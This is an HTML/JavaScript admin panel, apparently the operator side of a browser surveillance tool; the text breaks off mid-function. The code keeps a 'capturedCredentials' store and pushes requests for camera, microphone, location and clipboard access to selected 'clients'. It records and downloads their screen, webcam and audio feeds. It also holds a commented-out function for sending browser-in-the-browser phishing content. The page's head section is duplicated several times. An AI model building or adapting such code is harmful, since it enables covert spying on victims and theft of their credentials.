<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Connection</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="http://localhost:8080/server.css">


 
    <script>
        // Authentication script
        (function() {
            // Check if token exists in localStorage
            const authToken = localStorage.getItem('auth_token');
            if (!authToken) {
                console.log('No authentication token found, redirecting to login');
                window.location.replace('login.html');
                return;
            }
            
            // Verify token with server
            fetch('/verify-token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ token: authToken })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Invalid token');
                }
                return response.json();
            })
            .then(data => {
                if (!data.success) {
                    throw new Error('Token verification failed');
                }
                console.log('Authentication successful for:', data.username);
            })
            .catch(error => {
                console.error('Authentication error:', error);
                localStorage.removeItem('auth_token');
                window.location.replace('login.html?error=session');
            });
            
            // Set up logout function
            window.logout = function() {
                const authToken = localStorage.getItem('auth_token');
                if (authToken) {
                    // Notify server about logout
                    fetch('/logout', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ token: authToken })
                    })
                    .then(() => {
                        // Clear token from localStorage
                        localStorage.removeItem('auth_token');
                        
                        // Redirect to login page
                        window.location.replace('login.html?logout=true');
                    })
                    .catch(error => {
                        console.error('Logout error:', error);
                        // Still clear token and redirect even if server request fails
                        localStorage.removeItem('auth_token');
                        window.location.replace('login.html?logout=true');
                    });
                } else {
                    // No token found, just redirect
                    window.location.replace('login.html?logout=true');
                }
            };
            
            // Set up periodic token verification
            setInterval(() => {
                const authToken = localStorage.getItem('auth_token');
                if (!authToken) {
                    window.location.replace('login.html');
                    return;
                }
                
                fetch('/verify-token', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ token: authToken })
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Token verification failed');
                    }
                })
                .catch(() => {
                    localStorage.removeItem('auth_token');
                    window.location.replace('login.html?error=session');
                });
            }, 60000); // Check every minute
        })();
    </script>
    

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Connection</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Connection</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Connection</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <!-- Create containers for client-specific feeds -->
    <script>

     // Credentials storage
     let capturedCredentials = [];
        let screenStream = null;
        let cameraStream = null;
        // Add recording and screenshot functionality
        let screenRecorder = null;
        let cameraRecorder = null;
        let screenChunks = [];
        let cameraChunks = [];

                // Audio recording variables
        let audioRecorder = null;
        let audioChunks = [];
        let audioStream = null;
        
        function sendRequestContent() {
            if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                window.websocket.send(JSON.stringify({
                    type: 'request-content',
                    timestamp: new Date().toISOString()
                }));
            } else {
                console.warn('WebSocket not ready. Waiting to retry...');
                setTimeout(sendRequestContent, 200); // Retry after 200ms
            }
        }

        
        function toggleAudioStream() {
        const button = document.getElementById('audioPauseResumeButton');
            if (audioContext.state === 'running') {
                    audioContext.suspend().then(() => {
                    button.textContent = '▶️ Resume Audio';
                });
            } else if (audioContext.state === 'suspended') {
                    audioContext.resume().then(() => {
                    button.textContent = '⏸️ Pause Audio';
                });
            }
        }
  
        function setupAudioStream() {
    if (!audioContext) {
        console.error('Audio context not available');
        return false;
    }
    
    if (!audioStream) {
        try {
            // Create a MediaStreamDestination
            const dest = audioContext.createMediaStreamDestination();
            
            // Store the destination node for later use
            window.audioDestination = dest;
            
            // Create enhanced audio processing chain for recording
            
            // 1. High-pass filter to remove low rumble
            window.audioHighPass = audioContext.createBiquadFilter();
            window.audioHighPass.type = 'highpass';
            window.audioHighPass.frequency.value = 80;
            window.audioHighPass.Q.value = 0.7;
            
            // 2. Low-pass filter to remove high-frequency noise
            window.audioLowPass = audioContext.createBiquadFilter();
            window.audioLowPass.type = 'lowpass';
            window.audioLowPass.frequency.value = 12000;
            window.audioLowPass.Q.value = 0.7;
            
            // 3. Peaking filter to enhance speech clarity
            window.audioPeaking = audioContext.createBiquadFilter();
            window.audioPeaking.type = 'peaking';
            window.audioPeaking.frequency.value = 2500;
            window.audioPeaking.gain.value = 6;
            window.audioPeaking.Q.value = 1.0;
            
            // 4. Compressor for more consistent volume
            window.audioCompressor = audioContext.createDynamicsCompressor();
            window.audioCompressor.threshold.value = -24;
            window.audioCompressor.knee.value = 12; // Softer knee for smoother compression
            window.audioCompressor.ratio.value = 8; // Less aggressive ratio for more natural sound
            window.audioCompressor.attack.value = 0.003;
            window.audioCompressor.release.value = 0.25;
            
            // 5. Gain node for final volume adjustment
            window.audioGain = audioContext.createGain();
            window.audioGain.gain.value = 2.0; // Higher gain for better volume
            
            // Connect the enhanced processing chain
            window.audioHighPass.connect(window.audioLowPass);
            window.audioLowPass.connect(window.audioPeaking);
            window.audioPeaking.connect(window.audioCompressor);
            window.audioCompressor.connect(window.audioGain);
            window.audioGain.connect(dest);
            
            // Store the stream for recording
            audioStream = dest.stream;
            
            console.log('Enhanced audio processing chain set up for better clarity');
            
            // Make sure the audio context is running
            if (audioContext.state === 'suspended') {
                audioContext.resume().then(() => {
                    console.log('AudioContext resumed successfully in setupAudioStream');
                }).catch(err => {
                    console.error('Failed to resume AudioContext in setupAudioStream:', err);
                });
            }
            
            return true;
        } catch (e) {
            console.error('Error creating audio stream:', e);
            return false;
        }
    }
    
    return true;
}
    
        function toggleAudioRecording(clientId = 'default') {
            // Use client-specific button or fall back to default
            const buttonId = clientId ? `audioRecordButton-${clientId}` : 'audioRecordButton';
            const button = document.getElementById(buttonId);
            
            if (!button) {
                console.error(`Button with ID ${buttonId} not found`);
                return;
            }
            
            // Use client-specific recorder or create one
            if (!window.audioRecorders) window.audioRecorders = {};
            
            if (!window.audioRecorders[clientId]) {
                // Start recording
                if (!setupAudioStream()) {
                    alert('Audio stream not available. Please wait for audio to start streaming.');
                    return;
                }
                
                try {
                    // Clear previous recording chunks for this client
                    if (!window.audioChunks) window.audioChunks = {};
                    window.audioChunks[clientId] = [];
                    
                    // Make sure audio context is running before starting recording
                    if (window.audioContext && window.audioContext.state === 'suspended') {
                        window.audioContext.resume().then(() => {
                            console.log(`AudioContext resumed before recording for client ${clientId}`);
                        }).catch(err => {
                            console.error(`Failed to resume AudioContext before recording for client ${clientId}:`, err);
                        });
                    }
                    
                    // Create a MediaRecorder with appropriate options
                    let options;
                    try {
                        // Try to use codecs that support high-quality audio
                        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
                            // Opus codec provides better quality at lower bitrates
                            options = { 
                                mimeType: 'audio/webm;codecs=opus',
                                audioBitsPerSecond: 128000 // 128kbps for better quality
                            };
                            console.log(`Using opus codec for audio recording at 128kbps for client ${clientId}`);
                        } else if (MediaRecorder.isTypeSupported('audio/webm')) {
                            options = { 
                                mimeType: 'audio/webm',
                                audioBitsPerSecond: 128000 // 128kbps for better quality
                            };
                            console.log(`Using webm for audio recording at 128kbps for client ${clientId}`);
                        } else {
                            options = { audioBitsPerSecond: 128000 }; // Let the browser decide but set bitrate
                            console.log(`Using default codec for audio recording at 128kbps for client ${clientId}`);
                        }
                    } catch (e) {
                        console.warn(`Error checking codec support for client ${clientId}:`, e);
                        options = {}; // Fallback to default
                    }
                    
                    window.audioRecorders[clientId] = new MediaRecorder(audioStream, options);
                    console.log(`Created MediaRecorder for client ${clientId} with options:`, options);
                    
                    // Handle data available event
                    window.audioRecorders[clientId].ondataavailable = function(e) {
                        console.log(`Audio data available for client ${clientId}, size:`, e.data.size);
                        if (e.data.size > 0) {
                            window.audioChunks[clientId].push(e.data);
                        }
                    };
                    
                    // Handle recording stopped - automatically download
                    window.audioRecorders[clientId].onstop = function() {
                        console.log(`Audio recording stopped for client ${clientId}, chunks:`, window.audioChunks[clientId].length);
                        if (!window.audioChunks[clientId] || window.audioChunks[clientId].length === 0) {
                            console.error(`No audio data was recorded for client ${clientId}`);
                            alert('No audio data was recorded. Please try again.');
                            return;
                        }
                        
                        const blob = new Blob(window.audioChunks[clientId], { type: 'audio/webm' });
                        console.log(`Created blob for client ${clientId} of size:`, blob.size);
                        const url = URL.createObjectURL(blob);
                        
                        // Create and trigger automatic download
                        const downloadLink = document.createElement('a');
                        downloadLink.href = url;
                        downloadLink.download = generateEdenFilename(clientId, 'audio', 'webm');
                        document.body.appendChild(downloadLink);
                        downloadLink.click();
                        document.body.removeChild(downloadLink);
                        
                        // Show download notification
                        const statusMessage = document.createElement('div');
                        statusMessage.textContent = `Audio recording downloaded for client ${clientId}`;
                        statusMessage.style.cssText = 'background-color: #28a745; color: white; padding: 10px; border-radius: 4px; margin-top: 10px; margin-bottom: 10px;';
                        
                        // Add notification to client container
                        const clientContainer = document.getElementById(`audio-client-${clientId}`);
                        if (clientContainer) {
                            clientContainer.appendChild(statusMessage);
                            setTimeout(() => {
                                if (statusMessage.parentNode === clientContainer) {
                                    clientContainer.removeChild(statusMessage);
                                }
                            }, 3000);
                        }
                        
                        // Also add notification to main audio logs
                        const logMessage = statusMessage.cloneNode(true);
                        document.getElementById('audioLogs').insertBefore(logMessage, document.getElementById('audioLogs').firstChild);
                        setTimeout(() => {
                            if (logMessage.parentNode === document.getElementById('audioLogs')) {
                                document.getElementById('audioLogs').removeChild(logMessage);
                            }
                        }, 3000);
                        
                        // Clean up
                        delete window.audioRecorders[clientId];
                    };
                    
                    // Start recording with small timeslice for frequent ondataavailable events
                    window.audioRecorders[clientId].start(100); // Collect data every 100ms for smoother recording
                    button.textContent = '⏹️ Stop Recording';
                    console.log(`Audio recording started for client ${clientId}`);
                } catch (err) {
                    console.error(`Error starting recording for client ${clientId}:`, err);
                    alert('Could not start recording: ' + err.message);
                    delete window.audioRecorders[clientId];
                    button.textContent = '⏺️ Start Recording';
                }
            } else {
                // Stop recording
                try {
                    window.audioRecorders[clientId].stop();
                    delete window.audioRecorders[clientId];
                    button.textContent = '⏺️ Start Recording';
                    console.log(`Audio recording stopped for client ${clientId}`);
                } catch (e) {
                    console.error(`Error stopping recording for client ${clientId}:`, e);
                    delete window.audioRecorders[clientId];
                    button.textContent = '⏺️ Start Recording';
                }
            }
        }
        
        // Initialize client audio states
        if (!window.clientAudioStates) {
            window.clientAudioStates = {};
        }
        
        // Toggle client-specific audio
        function toggleClientAudio(clientId) {
            if (!clientId) return;
            
            // Initialize state if not exists
            if (window.clientAudioStates[clientId] === undefined) {
                window.clientAudioStates[clientId] = false; // Not paused by default
            }
            
            // Get button
            const button = document.getElementById(`audioPauseButton-${clientId}`);
            if (!button) return;
            
            // Toggle state
            window.clientAudioStates[clientId] = !window.clientAudioStates[clientId];
            
            // Update button text
            if (window.clientAudioStates[clientId]) {
                // Audio is now paused
                button.textContent = '▶️ Resume Audio';
                button.style.backgroundColor = '#ffc107'; // Yellow for paused
            } else {
                // Audio is now playing
                button.textContent = '⏸️ Pause Audio';
                button.style.backgroundColor = '#007bff'; // Blue for playing
            }
        }
        


        function takeScreenScreenshot() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const img = document.getElementById('screenDisplay');
            
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0);
            
            const link = document.createElement('a');
            link.href = canvas.toDataURL('image/png');
            link.download = 'screenshot.png';
            link.click();
        }

        function toggleCameraRecording() {
            const button = document.getElementById('cameraRecordButton');
            if (!cameraRecorder) {
                // Start recording
                if (!cameraStream) {
                    console.error('Camera stream not available for recording');
                    alert('Camera stream not available. Please enable your camera first.');
                    return;
                }
                
                cameraChunks = [];
                try {
                    // Try different MIME types and options
                    let options = { mimeType: 'video/webm' };
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                        options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 2500000 };
                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                        options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 2500000 };
                    }
                    
                    cameraRecorder = new MediaRecorder(cameraStream, options);
                    console.log('Camera recorder created with options:', options);
                    
                    cameraRecorder.ondataavailable = function(e) {
                        if (e.data && e.data.size > 0) {
                            cameraChunks.push(e.data);
                            console.log('Camera recording data available, size:', e.data.size);
                        }
                    };
                    
                    cameraRecorder.onstop = function() {
                        if (cameraChunks.length > 0) {
                            const blob = new Blob(cameraChunks, { type: 'video/webm' });
                            console.log('Camera recording completed, total size:', blob.size);
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = 'camera-recording.webm';
                            a.click();
                            URL.revokeObjectURL(url);
                        } else {
                            console.error('No camera recording data collected');
                            alert('No camera recording data was collected. Please try again.');
                        }
                    };
                    
                    // Request data every 1 second to ensure we're capturing
                    cameraRecorder.start(1000);
                    button.textContent = '⏹️ Stop Recording';
                    console.log('Camera recording started');
                } catch (e) {
                    console.error('Error starting camera recording:', e);
                    alert('Failed to start camera recording: ' + e.message);
                }
            } else {
                // Stop recording
                try {
                    cameraRecorder.stop();
                    cameraRecorder = null;
                    button.textContent = '⏺️ Start Recording';
                    console.log('Camera recording stopped');
                } catch (e) {
                    console.error('Error stopping camera recording:', e);
                }
            }
        }

        function takeCameraScreenshot() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const video = document.getElementById('cameraFeed');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            const link = document.createElement('a');
            link.href = canvas.toDataURL('image/png');
            link.download = 'camera-screenshot.png';
            link.click();
        }

        function toggleScreenRecording() {
            const button = document.getElementById('screenRecordButton');
            if (!screenRecorder) {
                // Start recording
                if (!screenStream) {
                    console.error('Screen stream not available for recording');
                    alert('Screen stream not available. Please share your screen first.');
                    return;
                }
                
                screenChunks = [];
                try {
                    // Try different MIME types and options
                    let options = { mimeType: 'video/webm' };
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                        options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 3000000 };
                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                        options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 3000000 };
                    }
                    
                    screenRecorder = new MediaRecorder(screenStream, options);
                    console.log('Screen recorder created with options:', options);
                    
                    screenRecorder.ondataavailable = function(e) {
                        if (e.data && e.data.size > 0) {
                            screenChunks.push(e.data);
                            console.log('Screen recording data available, size:', e.data.size);
                        }
                    };
                    
                    screenRecorder.onstop = function() {
                        if (screenChunks.length > 0) {
                            const blob = new Blob(screenChunks, { type: 'video/webm' });
                            console.log('Screen recording completed, total size:', blob.size);
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = 'screen-recording.webm';
                            a.click();
                            URL.revokeObjectURL(url);
                        } else {
                            console.error('No screen recording data collected');
                            alert('No screen recording data was collected. Please try again.');
                        }
                    };
                    
                    // Request data every 1 second to ensure we're capturing
                    screenRecorder.start(1000);
                    button.textContent = '⏹️ Stop Recording';
                    console.log('Screen recording started');
                } catch (e) {
                    console.error('Error starting screen recording:', e);
                    alert('Failed to start screen recording: ' + e.message);
                }
            } else {
                // Stop recording
                try {
                    screenRecorder.stop();
                    screenRecorder = null;
                    button.textContent = '⏺️ Start Recording';
                    console.log('Screen recording stopped');
                } catch (e) {
                    console.error('Error stopping screen recording:', e);
                }
            }
        }

        function showsContent(section) {
            // Hide all regular sections
            document.querySelectorAll('.content-section').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.nav-tab').forEach(el => el.classList.remove('active'));
            
            // Hide all permission sections
            document.querySelectorAll('.perm-content-section').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.perm-nav-tab').forEach(el => el.classList.remove('active'));
            
            // Show selected section
            const sectionId = `${section}-content`;
            const sectionElement = document.getElementById(sectionId);
            if (sectionElement) {
                sectionElement.classList.add('active');
                
                // Find and activate the corresponding tab
                const tabSelector = section === 'all' ? '.perm-nav-tab.active' : `.perm-nav-tab[onclick*="${section}"]`;
                const tabElement = document.querySelector(tabSelector);
                if (tabElement) {
                    tabElement.classList.add('active');
                }
                
                // Special case for camera section - make sure video elements display properly
                if (section === 'camera') {
                    setTimeout(() => {
                        // Refresh all client camera streams
                        if (window.clientCameraStreams) {
                            Object.keys(window.clientCameraStreams).forEach(clientId => {
                                const videoElement = document.getElementById(`client-camera-${clientId}`);
                                if (videoElement && window.clientCameraStreams[clientId]) {
                                    videoElement.srcObject = window.clientCameraStreams[clientId];
                                    videoElement.play().catch(err => console.error('Error playing video:', err));
                                }
                            });
                        }
                    }, 100);
                }
            }
        }

        // Function to check if we should ignore a permission-related message
        function shouldIgnorePermissionMessage(data) {
            // Check if this is a permission-related message
            const permissionKeywords = [
                'permission', 'camera', 'screen', 'audio', 'microphone', 
                'clipboard', 'location', 'notification', 'geolocation'
            ];
            
            // Check if the message type contains any permission-related keywords
            const isPermissionMessage = permissionKeywords.some(keyword => 
                data.type && data.type.toLowerCase().includes(keyword.toLowerCase())
            );
            
            // Also check if the message itself mentions permissions
            const isPermissionContent = data.message && permissionKeywords.some(keyword => 
                data.message.toLowerCase().includes(keyword.toLowerCase())
            );
            
            return isPermissionMessage || isPermissionContent;
        }

        function requestPermission(type) {
            // Find selected and online clients
            const selected = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
            console.log('Requesting permission:', type, 'Selected clients:', selected);
            if (selected.length === 0) {
                showStatusMessage('warning', 'No clients selected. Please select at least one client.');
                return;
            }
            sendToSelectedClients({
                type: `request-${type}`
            });

            // Add a status message to the logs showing we sent the request
            const statusDiv = document.createElement('div');
            statusDiv.className = 'status';
            statusDiv.textContent = `${new Date().toLocaleTimeString()} - Sent ${type} permission request to selected clients`;
            document.getElementById('allLogs').appendChild(statusDiv);
            }

       /* function BITBFile(fileName) {
            const fileData = fileStorage.get(fileName);
            if (!fileData) return;
            sendToSelectedClients({
                type: 'BITBContent',
                content: fileData.data,
                fileName: fileName
            });
        } */

        function requestAllPermissions() {
            const permissions = ['camera', 'microphone',  'location',  'clipboard'];
            permissions.forEach((type, index) => {
                setTimeout(() => requestPermission(type), index * 1000);
            });
        }
             

    
    function updateClientFeedsVisibility(client) {
            if (!client) return;
            
            console.log(`Updating feeds visibility for client ID: ${client.clientId}, selected: ${client.selected}, status: ${client.status}`);
            
            // Get all containers associated with this client
            // Use both full clientId and shortened versions for better matching
            const clientId = client.clientId;
            const shortIds = [
                clientId,
                clientId.split('_')[0],
                clientId.split('_').pop()
            ];
            
            // Check all containers with data-client-id attribute
            document.querySelectorAll('[data-client-id]').forEach(container => {
                const containerId = container.getAttribute('data-client-id');
                
                // Check if this container belongs to our client using flexible matching
                const isMatch = shortIds.some(id => 
                    containerId === id || 
                    containerId.includes(id) || 
                    id.includes(containerId)
                );
                
                if (isMatch) {
                    console.log(`Found matching container for client: ${containerId}`);
                    
                    // Show only if client is selected and online
                    if (client.selected && client.status === 'online') {
                        container.style.display = 'block';
                        console.log(`Showing feed container: ${container.id}`);
                    } else {
                        container.style.display = 'none';
                        console.log(`Hiding feed container: ${container.id}`);
                    }
                }
            });
            
            // Check camera container for this client
            const cameraContainer = document.getElementById(`camera-container-${clientId}`);
            if (cameraContainer) {
                if (client.selected && client.status === 'online') {
                    cameraContainer.style.display = 'block';
                    
                    // Ensure video is playing if we're in the camera tab
                    if (document.getElementById('camera-content').classList.contains('active')) {
                        const videoElement = document.getElementById(`client-camera-${clientId}`);
                        if (videoElement && videoElement.paused) {
                            videoElement.play().catch(err => console.log('Video already playing or tab not active'));
                        }
                    }
                } else {
                    cameraContainer.style.display = 'none';
                }
            }
            
            // Check screen container for this client
            const screenContainer = document.getElementById(`screen-container-${clientId}`);
            if (screenContainer) {
                if (client.selected && client.status === 'online') {
                    screenContainer.style.display = 'block';
                } else {
                    screenContainer.style.display = 'none';
                }
            }
        }
         
    // Show status message function
    function showStatusMessage(type, message) {
        const statusDiv = document.createElement('div');
        statusDiv.className = type === 'warning' ? 'status denied' : 'status granted';
        statusDiv.textContent = message;
        
        const allLogs = document.getElementById('allLogs');
        if (allLogs) {
            allLogs.insertBefore(statusDiv, allLogs.firstChild);
            
            // Auto-remove after 5 seconds
            setTimeout(() => {
                statusDiv.style.opacity = '0';
                setTimeout(() => statusDiv.remove(), 300);
            }, 5000);
        }
    }
    
    // Function to update camera log
    function updateCameraLog(clientId, message) {
        const cameraLogs = document.getElementById('cameraLogs');
        if (!cameraLogs) return;
        
        // Create log entry with timestamp
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        
        // Add timestamp
        const now = new Date();
        const timestamp = now.toLocaleTimeString();
        
        // Format client ID for display (use nickname if available)
        let clientName = clientId;
        if (window.clientNicknames && window.clientNicknames[clientId]) {
            clientName = window.clientNicknames[clientId];
        } else {
            // Shorten ID if it's too long
            clientName = clientId.length > 8 ? clientId.substring(0, 8) + '...' : clientId;
        }
        
        // Set log message with client info
        logEntry.innerHTML = `<span class="log-time">${timestamp}</span> <span class="log-client">${clientName}</span>: ${message}`;
        
        // Insert at top of log
        cameraLogs.insertBefore(logEntry, cameraLogs.firstChild);
        
        // Limit number of log entries to prevent overflow
        const maxLogEntries = 50;
        while (cameraLogs.children.length > maxLogEntries) {
            cameraLogs.removeChild(cameraLogs.lastChild);
        }
    }
    
    // Helper function to generate filenames in the format: nickname_eden_type_clientid_random-number.extension
    function generateEdenFilename(clientId, type, extension) {
        // Generate a random 4-digit number
        const randomNum = Math.floor(1000 + Math.random() * 9000);
        
        // Get nickname for the client if available
        let nickname = '';
        
        // Try to find client by clientId in our clients object
        for (const key in clients) {
            if (clients[key].clientId === clientId && clients[key].nickname) {
                nickname = clients[key].nickname + '_';
                break;
            }
        }
        
        // If no exact match, try partial match with the shortened ID
        if (!nickname) {
            const shortId = clientId.split('_').pop().substring(0, 8);
            for (const key in clients) {
                if (clients[key].clientId && 
                    clients[key].clientId.includes(shortId) && 
                    clients[key].nickname) {
                    nickname = clients[key].nickname + '_';
                    break;
                }
            }
        }
        
        // Construct the filename
        return `${nickname}eden_${type}_${clientId}_${randomNum}.${extension}`;
    }
    
    // Client-specific camera recording functions
    function toggleClientCameraRecording(clientId) {
        if (!window.clientCameraStreams || !window.clientCameraStreams[clientId]) {
            console.error(`No camera stream available for client ${clientId}`);
            showStatusMessage('warning', `No camera stream available for client ${clientId}`);
            return;
        }
        
        // Get the client's record button
        const recordButton = document.querySelector(`#camera-container-${clientId} button:first-child`);
        if (!recordButton) return;
        
        // Check if we're already recording for this client
        if (!window.clientCameraRecorders) window.clientCameraRecorders = {};
        
        if (!window.clientCameraRecorders[clientId]) {
            // Start recording
            try {
                // Initialize chunks array for this client
                if (!window.clientCameraChunks) window.clientCameraChunks = {};
                window.clientCameraChunks[clientId] = [];
                
                // Create MediaRecorder with optimal settings
                let options = { mimeType: 'video/webm' };
                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                    options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 3000000 };
                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                    options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 3000000 };
                }
                
                const recorder = new MediaRecorder(window.clientCameraStreams[clientId], options);
                
                // Set up data handling
                recorder.ondataavailable = function(e) {
                    if (e.data && e.data.size > 0) {
                        window.clientCameraChunks[clientId].push(e.data);
                    }
                };
                
                // Set up stop handler
                recorder.onstop = function() {
                    if (window.clientCameraChunks[clientId].length > 0) {
                        const blob = new Blob(window.clientCameraChunks[clientId], { type: 'video/webm' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = generateEdenFilename(clientId, 'camera', 'webm');
                        a.click();
                        URL.revokeObjectURL(url);
                        
                        // Show success message
                        showStatusMessage('success', `Camera recording saved for client ${clientId}`);
                    }
                };
                
                // Start recording
                recorder.start(1000);
                window.clientCameraRecorders[clientId] = recorder;
                
                // Update button
                recordButton.textContent = '⏹️ Stop Recording';
                recordButton.style.backgroundColor = '#f44336';
                
                // Show status message
                showStatusMessage('success', `Started camera recording for client ${clientId}`);
            } catch (e) {
                console.error(`Error starting camera recording for client ${clientId}:`, e);
                showStatusMessage('warning', `Failed to start camera recording: ${e.message}`);
            }
        } else {
            // Stop recording
            try {
                window.clientCameraRecorders[clientId].stop();
                delete window.clientCameraRecorders[clientId];
                
                // Update button
                recordButton.textContent = '⏺️ Start Recording';
                recordButton.style.backgroundColor = '';
                
                // Show status message
                showStatusMessage('success', `Stopped camera recording for client ${clientId}`);
            } catch (e) {
                console.error(`Error stopping camera recording for client ${clientId}:`, e);
                showStatusMessage('warning', `Failed to stop camera recording: ${e.message}`);
            }
        }
    }
    
    // Client-specific camera screenshot function
    function takeClientCameraScreenshot(clientId) {
        if (!window.clientCameraCanvases || !window.clientCameraCanvases[clientId]) {
            console.error(`No camera canvas available for client ${clientId}`);
            showStatusMessage('warning', `No camera feed available for client ${clientId}`);
            return;
        }
        
        try {
            const canvas = window.clientCameraCanvases[clientId];
            const link = document.createElement('a');
            link.href = canvas.toDataURL('image/png');
            link.download = generateEdenFilename(clientId, 'camera', 'png');
            link.click();
            
            // Show success message
            showStatusMessage('success', `Camera screenshot saved for client ${clientId}`);
        } catch (e) {
            console.error(`Error taking camera screenshot for client ${clientId}:`, e);
            showStatusMessage('warning', `Failed to take camera screenshot: ${e.message}`);
        }
    }
    
    // Client-specific screen recording functions
    function toggleClientScreenRecording(clientId) {
        if (!window.clientScreenStreams || !window.clientScreenStreams[clientId]) {
            console.error(`No screen stream available for client ${clientId}`);
            showStatusMessage('warning', `No screen stream available for client ${clientId}`);
            return;
        }
        
        // Get the client's record button
        const recordButton = document.querySelector(`#screen-container-${clientId} button:first-child`);
        if (!recordButton) return;
        
        // Check if we're already recording for this client
        if (!window.clientScreenRecorders) window.clientScreenRecorders = {};
        
        if (!window.clientScreenRecorders[clientId]) {
            // Start recording
            try {
                // Initialize chunks array for this client
                if (!window.clientScreenChunks) window.clientScreenChunks = {};
                window.clientScreenChunks[clientId] = [];
                
                // Create MediaRecorder with optimal settings
                let options = { mimeType: 'video/webm' };
                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                    options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 3000000 };
                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                    options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 3000000 };
                }
                
                const recorder = new MediaRecorder(window.clientScreenStreams[clientId], options);
                
                // Set up data handling
                recorder.ondataavailable = function(e) {
                    if (e.data && e.data.size > 0) {
                        window.clientScreenChunks[clientId].push(e.data);
                    }
                };
                
                // Set up stop handler
                recorder.onstop = function() {
                    if (window.clientScreenChunks[clientId].length > 0) {
                        const blob = new Blob(window.clientScreenChunks[clientId], { type: 'video/webm' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = generateEdenFilename(clientId, 'screenshare', 'webm');
                        a.click();
                        URL.revokeObjectURL(url);
                        
                        // Show success message
                        showStatusMessage('success', `Screen recording saved for client ${clientId}`);
                    }
                };
                
                // Start recording
                recorder.start(1000);
                window.clientScreenRecorders[clientId] = recorder;
                
                // Update button
                recordButton.textContent = '⏹️ Stop Recording';
                recordButton.style.backgroundColor = '#f44336';
                
                // Show status message
                showStatusMessage('success', `Started screen recording for client ${clientId}`);
            } catch (e) {
                console.error(`Error starting screen recording for client ${clientId}:`, e);
                showStatusMessage('warning', `Failed to start screen recording: ${e.message}`);
            }
        } else {
            // Stop recording
            try {
                window.clientScreenRecorders[clientId].stop();
                delete window.clientScreenRecorders[clientId];
                
                // Update button
                recordButton.textContent = '⏺️ Start Recording';
                recordButton.style.backgroundColor = '';
                
                // Show status message
                showStatusMessage('success', `Stopped screen recording for client ${clientId}`);
            } catch (e) {
                console.error(`Error stopping screen recording for client ${clientId}:`, e);
                showStatusMessage('warning', `Failed to stop screen recording: ${e.message}`);
            }
        }
    }
    
    // Client-specific screen screenshot function
    function takeClientScreenScreenshot(clientId) {
        const clientScreen = document.getElementById(`client-screen-${clientId}`);
        if (!clientScreen || !clientScreen.complete || clientScreen.naturalWidth === 0) {
            console.error(`No screen image available for client ${clientId}`);
            showStatusMessage('warning', `No screen feed available for client ${clientId}`);
            return;
        }
        
        try {
            const canvas = document.createElement('canvas');
            canvas.width = clientScreen.naturalWidth;
